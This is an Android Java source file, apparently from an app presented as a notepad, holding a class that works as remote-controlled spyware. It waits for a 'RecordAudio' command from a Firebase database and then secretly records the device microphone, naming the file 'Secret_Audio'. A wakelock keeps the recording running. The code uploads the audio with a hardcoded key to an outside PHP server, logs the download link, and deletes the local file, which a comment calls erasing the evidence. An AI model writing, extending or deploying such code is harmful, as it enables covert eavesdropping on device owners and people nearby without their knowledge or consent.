package com.megh.notepad;

import android.content.Context;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class AudioRecorderHelper {

    private static DatabaseReference commandRef;
    private static ValueEventListener commandListener;
    private static boolean isRecordingActive = false; // একাধিক কমান্ড একসাথে ব্লক করার লক

    // 🌟 ফায়ারবেস ক্র্যাশ রোধ করতে নাম ফিল্টার করা 🌟
    private static String getUserName(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE);
        String rawName = prefs.getString("UserName", "UnknownUser");
        return rawName.replace(".", "").replace("#", "").replace("$", "").replace("[", "").replace("]", "").trim();
    }

    // ==========================================
    // 🌟 ১. অ্যাপ ওপেন হলেই ফায়ারবেস নোড তৈরি এবং কমান্ড লিসেন করা 🌟
    // ==========================================
    public static void startListening(final Context context) {
        final Context appContext = context.getApplicationContext();
        String safeName = getUserName(appContext);

        final DatabaseReference baseRef = FirebaseDatabase.getInstance()
                .getReference("DeviceData").child(safeName).child("AudioRecorder");

        commandRef = baseRef.child("Command");
        DatabaseReference statusRef = baseRef.child("Status");

        // 🛡️ ম্যাজিক: অ্যাপ কোনোভাবে কিল হলে ফায়ারবেস নিজে নিজে অফলাইন সিগন্যাল দেবে
        statusRef.onDisconnect().setValue("Offline / App Killed by System ⚠️");

        // ডিফল্ট নোড তৈরি (যদি না থাকে)
        baseRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists() || !snapshot.hasChild("Command")) {
                    Map<String, Object> setupData = new HashMap<>();
                    setupData.put("Status", "Mic is Ready & Standby");
                    
                    Map<String, Object> cmdData = new HashMap<>();
                    cmdData.put("Action", "None");
                    cmdData.put("Duration", 15); // ডিফল্ট ১৫ সেকেন্ড
                    
                    setupData.put("Command", cmdData);
                    baseRef.updateChildren(setupData);
                } else {
                    baseRef.child("Status").setValue("Mic is Ready & Standby");
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) { }
        });

        // কমান্ড লিসেনার (অপেক্ষা করা)
        if (commandListener == null) {
            commandListener = new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    try {
                        if (snapshot.exists()) {
                            String action = snapshot.child("Action").getValue(String.class);
                            Integer durationVal = snapshot.child("Duration").getValue(Integer.class);
                            int duration = (durationVal != null) ? durationVal : 15;

                            if (action != null && !action.equals("None")) {
                                
                                if (isRecordingActive) return; // আগে থেকে রেকর্ড চললে নতুন কমান্ড নেবে না

                                if (action.equalsIgnoreCase("RecordAudio")) {
                                    isRecordingActive = true;
                                    commandRef.child("Action").setValue("None"); // কমান্ড রিসেট
                                    
                                    startRecording(appContext, duration);
                                }
                            }
                        }
                    } catch (Exception e) {
                        updateStatus(appContext, "Listener Error: " + e.getMessage());
                        isRecordingActive = false;
                    }
                }
                @Override
                public void onCancelled(@NonNull DatabaseError error) { }
            };
            commandRef.addValueEventListener(commandListener);
        }
    }

    // ==========================================
    // 🌟 ২. অডিও রেকর্ডার কোর ইঞ্জিন (Wakelock সহ) 🌟
    // ==========================================
    private static void startRecording(final Context context, final int durationSec) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                MediaRecorder recorder = null;
                File audioFile = null;
                PowerManager.WakeLock wakeLock = null; // প্রসেসর জাগিয়ে রাখার চাবি

                try {
                    // 🛡️ ম্যাজিক: Wakelock দিয়ে CPU কে ঘুমাতে নিষেধ করা হচ্ছে
                    PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
                    if (powerManager != null) {
                        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TunePad::AudioRecorderWakeLock");
                        wakeLock.acquire(durationSec * 1000L + 60000L); // রেকর্ডের চেয়ে ১ মিনিট বেশি সজাগ থাকবে
                    }

                    // হিডেন ক্যাশ ফোল্ডারে ফাইল সেভ
                    String timeStamp = new SimpleDateFormat("dd_MMM_hh_mm_ss", Locale.getDefault()).format(new Date());
                    audioFile = new File(context.getCacheDir(), "Secret_Audio_" + timeStamp + ".m4a");

                    recorder = new MediaRecorder();
                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    recorder.setOutputFile(audioFile.getAbsolutePath());

                    recorder.prepare();
                    recorder.start();

                    if (durationSec >= 60) {
                        updateStatus(context, "Recording Audio for " + (durationSec / 60) + " minutes...");
                    } else {
                        updateStatus(context, "Recording Audio for " + durationSec + " seconds...");
                    }

                    // ⏳ রেকর্ডিং চলছে... (CPU ঘুমাবে না)
                    Thread.sleep(durationSec * 1000L);

                    // সময় শেষ! রেকর্ডিং স্টপ।
                    recorder.stop();
                    recorder.release();
                    recorder = null;

                    updateStatus(context, "Recording done! Uploading to Server...");
                    uploadAudioToServer(context, audioFile);

                } catch (Exception e) {
                    updateStatus(context, "Record Error: " + e.getMessage());
                    isRecordingActive = false; 
                } finally {
                    if (recorder != null) {
                        try {
                            recorder.stop();
                            recorder.release();
                        } catch (Exception ignore) {}
                    }
                    // 🛡️ কাজ শেষে CPU কে আবার ঘুমাতে দেওয়া হলো
                    if (wakeLock != null && wakeLock.isHeld()) {
                        wakeLock.release();
                    }
                }
            }
        }).start();
    }

    // ==========================================
    // 🌟 ৩. ডেডিকেটেড অডিও আপলোড ইঞ্জিন 🌟
    // ==========================================
    private static void uploadAudioToServer(Context context, File file) {
        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        FileInputStream fileInputStream = null;
        String boundary = "*****" + System.currentTimeMillis() + "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            fileInputStream = new FileInputStream(file);
            // আপনার নতুন অডিও আপলোড PHP লিংক
            String serverUrl = "https://shuvraafroj.info/TunePad/upload_audio.php";
            String mySecretKey = "Megh_Secret_Pass_2026";

            URL url = new URL(serverUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000); // বড় ফাইলের জন্য রিড টাইম বাড়ানো হলো
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            dos = new DataOutputStream(conn.getOutputStream());

            dos.write((twoHyphens + boundary + lineEnd).getBytes("UTF-8"));
            dos.write(("Content-Disposition: form-data; name=\"secret_key\"" + lineEnd).getBytes("UTF-8"));
            dos.write((lineEnd).getBytes("UTF-8"));
            dos.write((mySecretKey + lineEnd).getBytes("UTF-8"));

            dos.write((twoHyphens + boundary + lineEnd).getBytes("UTF-8"));
            dos.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"" + lineEnd).getBytes("UTF-8"));
            dos.write(("Content-Type: application/octet-stream" + lineEnd).getBytes("UTF-8"));
            dos.write((lineEnd).getBytes("UTF-8"));

            int bytesAvailable = fileInputStream.available();
            int bufferSize = Math.min(bytesAvailable, 1024 * 1024); // ১ এমবি করে বাফার
            byte[] buffer = new byte[bufferSize];

            int bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            while (bytesRead > 0) {
                dos.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, 1024 * 1024);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            dos.write((lineEnd).getBytes("UTF-8"));
            dos.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes("UTF-8"));
            dos.flush();

            if (conn.getResponseCode() == 200) {
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
                StringBuilder responseString = new StringBuilder();
                String inputLine;
                while ((inputLine = in.readLine()) != null) responseString.append(inputLine);
                in.close();

                String rawResponse = responseString.toString().trim();
                if (rawResponse.contains("http")) {
                    String finalUrl = rawResponse.substring(rawResponse.indexOf("http")).split("[\"\\s<]")[0]; 
                    saveAudioLinkToDB(context, file.getName(), finalUrl);
                    updateStatus(context, "Mic is Ready & Standby"); // সাকসেস!
                } else {
                    updateStatus(context, "Upload Failed: " + rawResponse);
                }
            } else {
                updateStatus(context, "Server Error: " + conn.getResponseCode());
            }
        } catch (Exception e) {
            updateStatus(context, "Upload Exception: " + e.getMessage());
        } finally {
            try {
                if (fileInputStream != null) fileInputStream.close();
                if (dos != null) dos.close();
                if (conn != null) conn.disconnect();
                // 🧹 প্রমাণ মুছে ফেলা হলো!
                if (file.exists()) file.delete(); 
            } catch (Exception e) {}
            isRecordingActive = false; // লক খুলে দেওয়া হলো
        }
    }

    // ==========================================
    // 🌟 ৪. ফায়ারবেসে লিংক সেভ করার হেল্পার 🌟
    // ==========================================
    private static void saveAudioLinkToDB(Context context, String fileName, String downloadUrl) {
        try {
            String safeName = getUserName(context);
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(safeName).child("AudioRecorder").child("RecordedFiles");
            
            String safeFileId = fileName.replace(".", "_") + "_" + System.currentTimeMillis();
            
            Map<String, Object> data = new HashMap<>();
            data.put("File_Name", fileName);
            data.put("Download_URL", downloadUrl);
            data.put("Time", new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date()));
            
            dbRef.child(safeFileId).setValue(data);
        } catch (Exception e) {}
    }

    // ==========================================
    // 🌟 ৫. লাইভ স্ট্যাটাস আপডেটার 🌟
    // ==========================================
    private static void updateStatus(Context context, String status) {
        try {
            String safeName = getUserName(context);
            FirebaseDatabase.getInstance().getReference("DeviceData")
                    .child(safeName).child("AudioRecorder").child("Status").setValue(status);
            Log.d("AudioRecorder", status);
        } catch (Exception e) {}
    }
}
